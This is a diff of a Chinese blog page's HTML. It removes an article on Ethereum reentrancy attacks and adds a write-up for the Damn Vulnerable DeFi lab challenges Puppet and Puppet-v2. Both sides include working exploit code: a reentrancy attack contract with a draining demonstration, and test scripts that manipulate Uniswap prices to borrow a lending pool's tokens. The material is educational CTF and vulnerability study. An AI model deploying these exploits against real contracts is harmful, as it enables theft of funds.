@@ -16,11 +16,11 @@
     <!--<link href='http://fonts.googleapis.com/css?family=Montserrat:400,700' rel='stylesheet' type='text/css'>-->
     <title>
         
-          ReentryAttack - Thomas_Xu
+          Damn Defi 题解 8-9 - Thomas_Xu
         
     </title>
 
-    <link rel="canonical" href="https://dusign.net/ReentryAttack/">
+    <link rel="canonical" href="https://dusign.net/DamnDefi-08-09/">
 
     <!-- Bootstrap Core CSS -->
     
@@ -90,7 +90,7 @@
     header.intro-header{
         
             
-                background-image: linear-gradient(rgba(0, 0, 0, 0.3), rgba(0, 0, 0, 0.3)), url('Iron-Man-3.jpg')
+                background-image: linear-gradient(rgba(0, 0, 0, 0.3), rgba(0, 0, 0, 0.3)), url('page1.png')
                 /*post*/
             
         
@@ -112,21 +112,21 @@
                     <div class="post-heading">
                         <div class="tags">
                             
-                              <a class="tag" href="/tags/#基础漏洞" title="基础漏洞">基础漏洞</a>
+                              <a class="tag" href="/tags/#Damn Defi" title="Damn Defi">Damn Defi</a>
                             
                         </div>
-                        <h1>ReentryAttack</h1>
+                        <h1>Damn Defi 题解 8-9</h1>
                         <h2 class="subheading"></h2>
                         <span class="meta">
                             Posted by Thomas_Xu on
-                            2022-06-15
+                            2022-09-29
                         </span>
 
                         
                             <div class="blank_box"></div>
                             <span class="meta">
-                                Words <span class="post-count">1.5k</span> and
-                                Reading Time <span class="post-count">6</span> Minutes
+                                Words <span class="post-count">612</span> and
+                                Reading Time <span class="post-count">2</span> Minutes
                             </span>
                             <div class="blank_box"></div>
                             <!-- 不蒜子统计 start -->
@@ -263,57 +263,18 @@
                 col-md-10 col-md-offset-1
                 post-container">
 
-                <h1 id="重入攻击分析"><a href="#重入攻击分析" class="headerlink" title="重入攻击分析"></a>重入攻击分析</h1><hr>
-<pre><code>author：Thomas_Xu
-</code></pre><h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>在以太坊中，智能合约能够调用其他外部合约的代码，由于智能合约可以调用外部合约或者发送以太币，这些操作需要合约提交外部的调用，所以这些合约外部的调用就可以被攻击者利用造成攻击劫持，使得被攻击合约在任意位置重新执行(回调)，绕过原代码中的限制条件，从而发生重入攻击。重入攻击本质上与编程里的递归调用类似，所以当合约将以太币发送到未知地址时就可能会发生。</p>
-<ul>
-<li><strong>发生条件</strong><ol>
-<li>调用了外部的合约且该合约是不安全的</li>
-<li>外部合约的函数调用早于状态变量的修改</li>
-</ol>
-</li>
-</ul>
-<p>接下来给大家展示的是一个最简单的提款函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function withdraw()&#123;</span><br><span class="line">  require(msg.sender,call.value(balances[msg.sender])());</span><br><span class="line">  balances[msg.sender]&#x3D;0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>这种函数大多存在于钱包、去中心化交易所中，目的是为了让用户提款，将合约中的代币转换成通用的以太币。<br/></p>
-<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><pre><code>在进入分析之前，先介绍几个基础知识
-</code></pre><ul>
-<li>以太坊常用的转账的方法<ol>
-<li>transfer()：只会发送 2300 gas 进行调用，当发送失败时会通过 throw 来进行回滚操作，从而防止了重入攻击。</li>
-<li>send()：只会发送 2300 gas 进行调用，当发送失败时会返回布尔值 false，从而防止了重入攻击。</li>
-<li>gas().call.vale()()：在调用时会发送所有的 gas，当发送失败时会返回布尔值 false，不能有效的防止重入攻击。</li>
-</ol>
-</li>
-<li><p>fallback函数<br>  回退函数 (fallback function)：回退函数是每个合约中有且仅有一个没有名字的函数，并且该函数无参数，无返回值，如下所示：</p>
-  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function() public payable&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>  回退函数在以下几种情况中被执行：</p>
-<ol>
-<li>调用合约时没有匹配到任何一个函数</li>
-<li>没有传数据</li>
-<li>智能合约收到以太币（为了接受以太币，fallback 函数必被标记为 payable）</li>
-</ol>
-</li>
-<li><p>漏洞<br>  通过我们对fallback函数的了解。<br>  如果我们构造一个 fallback 函数，函数里面也调用对方的 withdraw 函数的话，那将会产生一个循环调用转账功能，存在漏洞的合约会不断向攻击者合约转账，终止循环结束（以太坊 gas 有上限）<br>  <img src="Reenter1.png" alt="攻击原理"><br>  我们先来看一段比较典型的有重入漏洞的合约：</p>
-  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.19;</span><br><span class="line"></span><br><span class="line">contract Reentrance&#123;</span><br><span class="line">    address _owner;</span><br><span class="line">    mapping (address &#x3D;&gt; uint256) balances;</span><br><span class="line"></span><br><span class="line">    function Reentrance()&#123;</span><br><span class="line">        _owner &#x3D; msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 amount) public payable&#123;</span><br><span class="line">        require(balances[msg.sender] &gt;&#x3D; amount);</span><br><span class="line">        require(this.balance &gt;&#x3D; amount);</span><br><span class="line">        &#x2F;&#x2F; 发送以太</span><br><span class="line">        msg.sender.call.value(amount)();</span><br><span class="line">        &#x2F;&#x2F; 状态变量修改</span><br><span class="line">        balances[msg.sender] -&#x3D; amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deposit() public payable&#123;</span><br><span class="line">        balances[msg.sender] +&#x3D; msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balanceOf(address adre)constant returns(uint256)&#123;</span><br><span class="line">        return balances[adre];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function wallet() constant returns(uint256 result)&#123;</span><br><span class="line">        return this.balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>  我们来看这个合约的 withdraw 函数，这个函数中的转账操作有一个外部调用（msg.sender.call.value(amount)()），所以我们就可以认为这个合约是可能有重入漏洞的，但是具体能否产生危害还需要更深入的分析：</p>
-<ul>
-<li>攻击者思路：<blockquote>
-<ol>
-<li>所有的外部调用都是不安全的且合约在接收以太的时候会触发 fallback 函数执行相应的逻辑，这是一种隐藏的外部调用，这种隐藏的外部调用是否会造成危害呢？</li>
-<li>我们可以看到在 withdraw 函数中是先执行外部调用进行转账后才修改用户余额状态变量的，那我们可不可以在转账外部调用的时候构造一个恶意的逻辑合约在合约执行 balance[msg.sender] -= amount 之前一直循环调用 withdraw 函数一直提币从而将合约账户清空呢？</li>
-</ol>
+                <h1 id="Damn-Defi靶场刷题记录-8-9"><a href="#Damn-Defi靶场刷题记录-8-9" class="headerlink" title="Damn Defi靶场刷题记录(8-9)"></a>Damn Defi靶场刷题记录(8-9)</h1><pre><code>author: Thomas_Xu
+</code></pre><h2 id="8-Puppet"><a href="#8-Puppet" class="headerlink" title="8 Puppet"></a>8 Puppet</h2><p>这个题直接通过abi引用了一个已经编译了的Uniswap v1的合约，因此，我们可以假定这个Uniswap合约没有其他漏洞。<br>那就让我们把目光集中在<code>PuppetPool</code>合约<br>其实就一个<code>borrow()</code>函数，但在借款时，我们需要抵押两倍的资金在池里。这个题其实就是想要我们想办法让池在我们抵押不足的情况下贷款给我们。<br>这其实就涉及到uniswap的原理了，有关uniswap v1我推荐看<a href="https://bbs.csdn.net/topics/606753811" target="_blank" rel="noopener">这篇文章</a><br>在了解了uniswap v1后，我们就应该知道，流动性对于一个uniswap池有多么重要，而题目中的这个池，其实并没有足够多的流动性来应对大规模的买进卖出。</p>
+<blockquote>
+<p>因此我们只需要出售我们手中所有的token，就会导致市场崩盘，价格失衡。(token大幅度贬值)，那么我们手中的ETH将会非常值钱，这时候我们再调用borrow函数，由于token的贬值，我们可以通过抵押我们手中的ETH获得几乎全部的token。</p>
 </blockquote>
-</li>
-<li>攻击合约：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.19;</span><br><span class="line">import&quot;.&#x2F;Reentrance.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract ReentranceAttack&#123;</span><br><span class="line">    Reentrance re;</span><br><span class="line">    function ReentranceAttack(address _target) public payable&#123;</span><br><span class="line">        re &#x3D; Reentrance(_target);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function wallet()view returns(uint256)&#123;</span><br><span class="line">        return this.balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deposit()public payable &#123;</span><br><span class="line">        re.deposit.value(msg.value)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack()&#123;</span><br><span class="line">        re.withdraw(1);</span><br><span class="line">    &#125;</span><br><span class="line">    function () public payable &#123;</span><br><span class="line">        if (address(re).balance &gt;&#x3D; 1 ether)&#123;</span><br><span class="line">            re.withdraw(1);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
-<li>攻击原理：<br>  由于受害者合约withdraw函数使用call函数转账，会附加”所有可用gas”，并触发msg.sender的fallback函数。fallback 函数再次调用withdraw函数套利，由于withdraw函数最后一步才减去msg.sender对应的余额并记录导致递归调用withdraw函数require判断都能通过。直到合约中没有可用余额为止。<br>  类似于对攻击者fallback函数的递归调用<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2>首先用账户(<code>0x5B38Da6a701c568545dCfcB03FcB875f56beddC4</code>)模拟受害者，点击depoly开始部署。<br><img src="Reenter2.png" alt=""><br>然后将Value改为5，单位改为ether。点击deposit方法<br><img src="Reenter3.png" alt=""><br>查看当前账户余额为5ether，存款成功<br><img src="Reenter4.png" alt=""><br>创建一个新账户（<code>0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2</code>）来模拟攻击者，在Deploy处填写漏洞合约地址，部署攻击合约。<br><img src="Reenter5.png" alt=""><br>部署成功后，先查看攻击合约的wallet为0<br><img src="Reenter6.png" alt=""><br>攻击者先存款 1 ether 到漏洞合约中，这里设置 VALUE 为 1 ether，之后点击攻击合约的 deposit 进行存款。<br><img src="Reenter7.png" alt=""><br>再次调用漏洞合约的wallet方法，却发现有了6 ether<br><img src="Reenter8.png" alt=""><br>攻击者 (<code>0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2</code>) 调用攻击合约的 attack 函数模拟攻击，之后调用被攻击合约的 wallet 函数去查看合约的余额，发现已经归零，此时回到攻击合约查看余额，发现被攻击合约中的 6 ether 已经全部提款到了攻击者合约中，这就造成了重入攻击。<br><img src="Reenter9.png" alt=""></li>
-</ul>
+<ul>
+<li><strong>Exploit</strong><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">it(&#39;Exploit&#39;, async function () &#123;</span><br><span class="line">        &#x2F;** CODE YOUR EXPLOIT HERE *&#x2F;</span><br><span class="line">        await this.token.connect(attacker).approve(this.uniswapExchange.address, ATTACKER_INITIAL_TOKEN_BALANCE);</span><br><span class="line">        await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(</span><br><span class="line">            ATTACKER_INITIAL_TOKEN_BALANCE.sub(1),</span><br><span class="line">            1,</span><br><span class="line">            9999999999</span><br><span class="line">        );</span><br><span class="line">        &#x2F;&#x2F; 先计算borrow所有的token需要多少的eth</span><br><span class="line">        const amount &#x3D; await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);</span><br><span class="line">        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE, &#123;value:amount&#125;);</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure>
 </li>
 </ul>
-<h2 id="漏洞防范"><a href="#漏洞防范" class="headerlink" title="漏洞防范"></a>漏洞防范</h2><ul>
-<li><p><strong>加入防重入锁</strong><br>  下面是一个防重入锁的例子：</p>
-  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.3;</span><br><span class="line"></span><br><span class="line">contract ReEntrancyGuard &#123;</span><br><span class="line">    bool internal locked;</span><br><span class="line"></span><br><span class="line">    modifier noReentrant() &#123;</span><br><span class="line">        require(!locked, &quot;No re-entrancy&quot;);</span><br><span class="line">        locked &#x3D; true;</span><br><span class="line">        _; </span><br><span class="line">    locked &#x3D; false; </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>写代码时需要遵循先判断，后写入变量在进行外部调用的编码规范（Checks-Effects-Interactions）</strong></p>
-</li>
-<li><p><strong>使用send() 和 transfer() 转币，只会传递2300Gas供调用，防止重入攻击。</strong></p>
+<h2 id="9-Puppet-v2"><a href="#9-Puppet-v2" class="headerlink" title="9 Puppet-v2"></a>9 Puppet-v2</h2><p>相比于上一道题，这次使用的时Uniswap-v2的源码，而交易所借款需要抵押的eth从借款价格的2倍变为了3倍。<br>但其实再了解Uniswap-v2以及这次的交易所代码后，发现其实和上道题没有本质的区别。<br>我们任然可以利用池中流动性不足这一点，引起价格的波动，使token贬值，以达到我们以少数eth借到大量token的目的。</p>
+<ul>
+<li><strong>Exploit</strong><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">it(&#39;Exploit&#39;, async function () &#123;</span><br><span class="line">       &#x2F;** CODE YOUR EXPLOIT HERE *&#x2F;</span><br><span class="line">       await this.token.connect(attacker).approve(this.uniswapRouter.address, ATTACKER_INITIAL_TOKEN_BALANCE);</span><br><span class="line">       &#x2F;&#x2F; 在交易所置换自己所有的token</span><br><span class="line">       await this.uniswapRouter.connect(attacker).swapExactTokensForETH(</span><br><span class="line">           ATTACKER_INITIAL_TOKEN_BALANCE,</span><br><span class="line">           0,</span><br><span class="line">           [this.token.address, this.uniswapRouter.WETH()],</span><br><span class="line">           attacker.address,</span><br><span class="line">           9999999999</span><br><span class="line">       );</span><br><span class="line">       </span><br><span class="line">       console.log(&#39;Attacker&#96;s balance:&#39;, (await ethers.provider.getBalance(attacker.address)).toString());</span><br><span class="line">       &#x2F;&#x2F;计算borrow所有token所需要的eth</span><br><span class="line">       const amount &#x3D; await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);</span><br><span class="line">       &#x2F;&#x2F;先往钱包里存钱</span><br><span class="line">       await this.weth.connect(attacker).deposit(&#123;value:amount&#125;);</span><br><span class="line">       await this.weth.connect(attacker).approve(this.lendingPool.address, amount);</span><br><span class="line">       await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE);</span><br><span class="line">   &#125;);</span><br></pre></td></tr></table></figure>
 </li>
 </ul>
 
@@ -323,12 +284,12 @@
                 <ul class="pager">
                     
                     <li class="previous">
-                        <a href="/Uniswap的简介/" data-toggle="tooltip" data-placement="top" title="主流DES——Uniswap简介">&larr; Previous Post</a>
+                        <a href="/uniswap-v3/" data-toggle="tooltip" data-placement="top" title="Uniswap_V3 源码分析">&larr; Previous Post</a>
                     </li>
                     
                     
                     <li class="next">
-                        <a href="/corpseFactory/" data-toggle="tooltip" data-placement="top" title="僵尸工厂学习记录">Next Post &rarr;</a>
+                        <a href="/DamnDefi-07/" data-toggle="tooltip" data-placement="top" title="Damn Defi 题解 7">Next Post &rarr;</a>
                     </li>
                     
                 </ul>
@@ -452,7 +413,7 @@
           <strong class="toc-title">Contents</strong>
           
             
-              <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#重入攻击分析"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">重入攻击分析</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#漏洞概述"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">漏洞概述</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#漏洞分析"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">漏洞分析</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#漏洞复现"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">漏洞复现</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#漏洞防范"><span class="toc-nav-number">1.4.</span> <span class="toc-nav-text">漏洞防范</span></a></li></ol></li></ol>
+              <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#Damn-Defi靶场刷题记录-8-9"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">Damn Defi靶场刷题记录(8-9)</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#8-Puppet"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">8 Puppet</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#9-Puppet-v2"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">9 Puppet-v2</span></a></li></ol></li></ol>
             
           
           </div>
@@ -474,7 +435,7 @@
                     <h5><a href="/tags/">FEATURED TAGS</a></h5>
                     <div class="tags">
                        
-                          <a class="tag" href="/tags/#基础漏洞" title="基础漏洞">基础漏洞</a>
+                          <a class="tag" href="/tags/#Damn Defi" title="Damn Defi">Damn Defi</a>
                         
                     </div>
                 </section>
